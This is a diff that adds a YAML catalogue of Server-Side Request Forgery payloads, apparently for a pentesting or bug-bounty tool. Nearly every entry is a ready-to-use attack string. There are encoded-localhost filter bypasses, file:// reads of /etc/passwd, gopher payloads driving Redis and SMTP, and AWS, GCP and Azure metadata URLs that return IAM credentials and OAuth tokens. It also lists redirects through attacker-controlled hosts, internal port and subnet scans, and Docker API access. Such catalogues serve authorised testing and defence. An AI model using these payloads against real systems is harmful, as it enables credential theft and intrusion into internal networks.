@@ -1,0 +1,281 @@
+# ssrf.yaml — Server-Side Request Forgery payloads
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "PayloadsAllTheThings/SSRF"
+    - "OWASP SSRF Prevention Cheat Sheet"
+    - "Orange Tsai SSRF Research"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# IP ENCODING VARIANTS (8 variants for 127.0.0.1)
+# ──────────────────────────────────────────────
+
+ip_encoding:
+  - name: hex_encoding
+    payload: "http://0x7f000001/"
+    context: "URL parameter where localhost IP is blocked"
+    notes: "127.0.0.1 in hexadecimal. Many URL parsers resolve this to localhost."
+
+  - name: octal_encoding
+    payload: "http://0177.0000.0000.0001/"
+    context: "URL parameter where localhost IP is blocked"
+    notes: "127.0.0.1 in octal notation. Supported by most OS network stacks."
+
+  - name: dword_encoding
+    payload: "http://2130706433/"
+    context: "URL parameter where localhost IP is blocked"
+    notes: "127.0.0.1 as single 32-bit integer (127*16777216 + 0*65536 + 0*256 + 1)."
+
+  - name: mixed_encoding
+    payload: "http://0x7f.0.0.0x01/"
+    context: "URL parameter where localhost IP is blocked"
+    notes: "Mixed hex and decimal octets. Parsers handle mixed notation differently."
+
+  - name: url_encoded
+    payload: "http://%31%32%37%2e%30%2e%30%2e%31/"
+    context: "URL parameter where IP pattern is regex-matched"
+    notes: "URL-encoded 127.0.0.1. Bypasses string-based IP detection."
+
+  - name: ipv6_localhost
+    payload: "http://[::1]/"
+    context: "URL parameter where IPv4 localhost is blocked"
+    notes: "IPv6 loopback address. Often overlooked in IPv4-only filters."
+
+  - name: ipv6_mapped_ipv4
+    payload: "http://[::ffff:127.0.0.1]/"
+    context: "URL parameter where both IPv4 and IPv6 localhost are blocked"
+    notes: "IPv4-mapped IPv6 address. Dual-stack systems resolve this to localhost."
+
+  - name: dns_rebinding
+    payload: "http://7f000001.3a74db28.rbndr.us/"
+    context: "URL parameter with DNS-based validation (checks on first resolve)"
+    notes: "DNS rebinding service. First resolve returns safe IP, second returns 127.0.0.1. Use rbndr.us or custom DNS server."
+
+  - name: ipv6_bracket_bypass
+    payload: "http://[0:0:0:0:0:ffff:127.0.0.1]/"
+    context: "URL parameter where short IPv6 notation is blocked"
+    notes: "Full IPv6 mapped IPv4 notation. Some filters only check short form."
+
+  - name: decimal_with_overflow
+    payload: "http://127.0.0.1.nip.io/"
+    context: "URL parameter with domain-based filtering"
+    notes: "nip.io wildcard DNS resolves any subdomain to the embedded IP."
+
+  - name: zero_shorthand
+    payload: "http://0/"
+    context: "URL parameter where 127.0.0.1 is blocked"
+    notes: "0 resolves to 0.0.0.0 on most systems, which binds to localhost services."
+
+  - name: class_a_localhost
+    payload: "http://127.1/"
+    context: "URL parameter where full 127.0.0.1 is blocked"
+    notes: "Short form of 127.0.0.1. Most systems expand 127.1 to 127.0.0.1."
+
+# ──────────────────────────────────────────────
+# PROTOCOL SCHEMES
+# ──────────────────────────────────────────────
+
+protocol_schemes:
+  - name: file_protocol_etc_passwd
+    payload: "file:///etc/passwd"
+    context: "URL parameter that accepts arbitrary schemes"
+    notes: "Read local files. Most impactful SSRF primitive."
+
+  - name: file_protocol_windows
+    payload: "file:///C:/Windows/win.ini"
+    context: "URL parameter on Windows server"
+    notes: "Read Windows local files via file:// scheme."
+
+  - name: dict_protocol
+    payload: "dict://127.0.0.1:6379/INFO"
+    context: "URL parameter that supports dict:// protocol"
+    notes: "DICT protocol can interact with Redis, Memcached. Gets server info."
+
+  - name: gopher_redis_set
+    payload: "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$11%0d%0ahello+world%0d%0a"
+    context: "URL parameter that supports gopher:// protocol"
+    notes: "Gopher protocol sends raw TCP. Can interact with Redis, SMTP, MySQL etc."
+
+  - name: gopher_smtp
+    payload: "gopher://127.0.0.1:25/_HELO+localhost%0d%0aMAIL+FROM:<attacker@evil.com>%0d%0aRCPT+TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:+SSRF+Test%0d%0a%0d%0aSSRF+email+test%0d%0a.%0d%0aQUIT"
+    context: "URL parameter with gopher support and internal SMTP server"
+    notes: "Send emails via internal SMTP using gopher protocol."
+
+  - name: ftp_protocol
+    payload: "ftp://127.0.0.1:21/"
+    context: "URL parameter that supports ftp:// scheme"
+    notes: "FTP directory listing. Can exfiltrate data via FTP bounce."
+
+  - name: tftp_protocol
+    payload: "tftp://127.0.0.1:69/testfile"
+    context: "URL parameter that supports tftp:// scheme"
+    notes: "TFTP is UDP-based, sometimes supported by URL fetchers."
+
+  - name: ldap_protocol
+    payload: "ldap://127.0.0.1:389/%0astatus"
+    context: "URL parameter that supports ldap:// scheme"
+    notes: "LDAP protocol can query internal directory services."
+
+# ──────────────────────────────────────────────
+# CLOUD METADATA (AWS, GCP, Azure)
+# ──────────────────────────────────────────────
+
+cloud_metadata_aws:
+  - name: aws_imdsv1_credentials
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    context: "SSRF on AWS EC2 instance with IMDSv1 enabled"
+    notes: "Lists IAM role names. Append role name to get temporary credentials. No headers needed for IMDSv1."
+
+  - name: aws_imdsv1_role_credentials
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
+    context: "SSRF on AWS EC2 after discovering role name"
+    notes: "Returns AccessKeyId, SecretAccessKey, Token. Replace ROLE_NAME with discovered role."
+
+  - name: aws_imdsv1_user_data
+    payload: "http://169.254.169.254/latest/user-data"
+    context: "SSRF on AWS EC2 instance"
+    notes: "User data scripts often contain secrets, API keys, bootstrap configs."
+
+  - name: aws_imdsv1_identity_doc
+    payload: "http://169.254.169.254/latest/dynamic/instance-identity/document"
+    context: "SSRF on AWS EC2 instance"
+    notes: "Returns accountId, instanceId, region, instanceType. Useful for further attacks."
+
+  - name: aws_imdsv2_token_request
+    payload: "http://169.254.169.254/latest/api/token"
+    context: "SSRF on AWS EC2 with IMDSv2. Requires PUT method with header: X-aws-ec2-metadata-token-ttl-seconds: 21600"
+    notes: "IMDSv2 requires a PUT request to get token first. Header X-aws-ec2-metadata-token-ttl-seconds is mandatory. Many SSRF vectors cannot send PUT or custom headers, making IMDSv2 harder to exploit."
+
+  - name: aws_imdsv2_with_token
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    context: "SSRF on AWS EC2 with IMDSv2 token. Requires header: X-aws-ec2-metadata-token: TOKEN_FROM_PUT"
+    notes: "After obtaining IMDSv2 token via PUT, use it in this GET request header."
+
+  - name: aws_ecs_task_metadata
+    payload: "http://169.254.170.2/v2/credentials/GUID"
+    context: "SSRF on AWS ECS container"
+    notes: "ECS task role credentials endpoint. GUID from AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var."
+
+  - name: aws_lambda_env
+    payload: "http://localhost:9001/2018-06-01/runtime/invocation/next"
+    context: "SSRF within AWS Lambda function"
+    notes: "Lambda runtime API. Environment variables contain secrets at /proc/self/environ."
+
+cloud_metadata_gcp:
+  - name: gcp_metadata_project
+    payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+    context: "SSRF on GCP instance. Requires header: Metadata-Flavor: Google"
+    notes: "GCP metadata REQUIRES Metadata-Flavor: Google header. Without it, returns 403."
+
+  - name: gcp_metadata_access_token
+    payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    context: "SSRF on GCP instance. Requires header: Metadata-Flavor: Google"
+    notes: "Returns OAuth2 access token for default service account."
+
+  - name: gcp_metadata_ssh_keys
+    payload: "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
+    context: "SSRF on GCP instance. Requires header: Metadata-Flavor: Google"
+    notes: "Returns SSH public keys configured for the project."
+
+  - name: gcp_metadata_kube_env
+    payload: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
+    context: "SSRF on GKE node. Requires header: Metadata-Flavor: Google"
+    notes: "Contains kubelet credentials on GKE nodes."
+
+  - name: gcp_beta_header_bypass
+    payload: "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
+    context: "SSRF on GCP instance where custom headers cannot be set"
+    notes: "v1beta1 endpoint does NOT require Metadata-Flavor header. Deprecated but may still work."
+
+cloud_metadata_azure:
+  - name: azure_metadata_identity
+    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    context: "SSRF on Azure VM. Requires header: Metadata: true"
+    notes: "Azure IMDS requires Metadata: true header. Returns full instance info."
+
+  - name: azure_managed_identity_token
+    payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    context: "SSRF on Azure VM with managed identity. Requires header: Metadata: true"
+    notes: "Returns OAuth2 token for Azure Resource Manager. Change resource param for other APIs."
+
+  - name: azure_metadata_network
+    payload: "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"
+    context: "SSRF on Azure VM. Requires header: Metadata: true"
+    notes: "Returns network config including private/public IPs, subnet info."
+
+  - name: azure_app_service_env
+    payload: "http://169.254.130.1/metadata/v1/EnvironmentVariables"
+    context: "SSRF on Azure App Service"
+    notes: "App Service uses different metadata endpoint. Contains app settings and connection strings."
+
+# ──────────────────────────────────────────────
+# REDIRECT CHAIN TECHNIQUES
+# ──────────────────────────────────────────────
+
+redirect_chains:
+  - name: open_redirect_to_metadata
+    payload: "https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
+    context: "When direct metadata access is blocked but redirects are followed"
+    notes: "Chain an open redirect on the target to reach metadata endpoint."
+
+  - name: url_shortener_redirect
+    payload: "https://bit.ly/CUSTOM_SHORT_URL"
+    context: "When URL validation checks domain but follows redirects"
+    notes: "Create a short URL pointing to metadata endpoint. Bypasses domain allowlist."
+
+  - name: dns_to_internal
+    payload: "http://attacker-controlled-domain.com/"
+    context: "DNS A record pointed at 169.254.169.254 or 127.0.0.1"
+    notes: "Set up DNS pointing your domain to internal IP. Bypasses IP-based filters that check URL string."
+
+  - name: http_redirect_server
+    payload: "http://attacker.com/redirect.php"
+    context: "Attacker hosts a 302 redirect to internal IP"
+    notes: "Server responds with Location: http://169.254.169.254/. Bypasses URL-based validation."
+
+  - name: cname_chain
+    payload: "http://ssrf.attacker.com/"
+    context: "CNAME record pointing to internal hostname"
+    notes: "DNS CNAME to internal.target.com. Bypasses IP checks that only inspect URL domain."
+
+# ──────────────────────────────────────────────
+# INTERNAL SERVICE DISCOVERY
+# ──────────────────────────────────────────────
+
+internal_discovery:
+  - name: common_ports_scan
+    payload: "http://127.0.0.1:PORT/"
+    context: "Replace PORT with common internal ports: 80, 443, 8080, 8443, 3000, 5000, 6379, 27017, 3306, 5432, 9200, 8888, 9090, 2379"
+    notes: "Port scan via SSRF. Response time and error differences reveal open ports."
+
+  - name: internal_subnet_scan
+    payload: "http://10.0.0.X/"
+    context: "Replace X with 1-254 to scan internal /24 subnet"
+    notes: "Discover internal hosts via SSRF. Check 10.x, 172.16-31.x, 192.168.x ranges."
+
+  - name: kubernetes_api
+    payload: "https://kubernetes.default.svc.cluster.local/api/v1/namespaces"
+    context: "SSRF from pod in Kubernetes cluster"
+    notes: "Kubernetes API server. If service account token is available, can enumerate resources."
+
+  - name: docker_socket
+    payload: "http://127.0.0.1:2375/containers/json"
+    context: "SSRF on host with Docker API exposed"
+    notes: "Docker daemon API. Can list/create/exec containers for RCE."
+
+  - name: consul_api
+    payload: "http://127.0.0.1:8500/v1/catalog/services"
+    context: "SSRF on host running HashiCorp Consul"
+    notes: "Service discovery via Consul API. Lists all registered services."
+
+  - name: elasticsearch
+    payload: "http://127.0.0.1:9200/_cat/indices"
+    context: "SSRF on host with Elasticsearch"
+    notes: "List all Elasticsearch indices. Often contains sensitive data."
+
+  - name: redis_info
+    payload: "http://127.0.0.1:6379/"
+    context: "SSRF on host with Redis (via HTTP)"
+    notes: "Redis responds to HTTP with error containing version info. Use dict:// or gopher:// for full interaction."
